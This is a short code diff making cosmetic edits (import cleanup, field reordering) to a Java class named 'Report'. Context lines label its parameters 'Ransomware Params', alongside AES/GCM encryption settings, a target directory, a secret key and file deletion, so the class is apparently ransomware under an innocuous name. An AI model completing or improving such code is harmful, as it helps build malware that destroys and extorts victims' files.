@@ -6,15 +6,18 @@ import java.io.FileInputStream;
 import java.io.FileOutputStream;
 import java.nio.file.Paths;
 import java.security.NoSuchAlgorithmException;
-import java.util.*;
+import java.util.ArrayList;
+import java.util.Arrays;
+import java.util.List;
+import java.util.Objects;
 
 public class Report {
-    private static Report instance;
-    public Port port;
     // AES - Cryptography Params
     private static final String ENCRYPT_ALGO = "AES/GCM/NoPadding";
     private static final int TAG_LENGTH_BIT = 128;
     private static final int IV_LENGTH_BYTE = 12;
+    private static Report instance;
+    public Port port;
     // Ransomware Params
     private File directory;
     private SecretKey secretKey;
@@ -134,7 +137,6 @@ public class Report {
             f.delete();
         }
     }
-
 
 
     public class Port implements IReport {
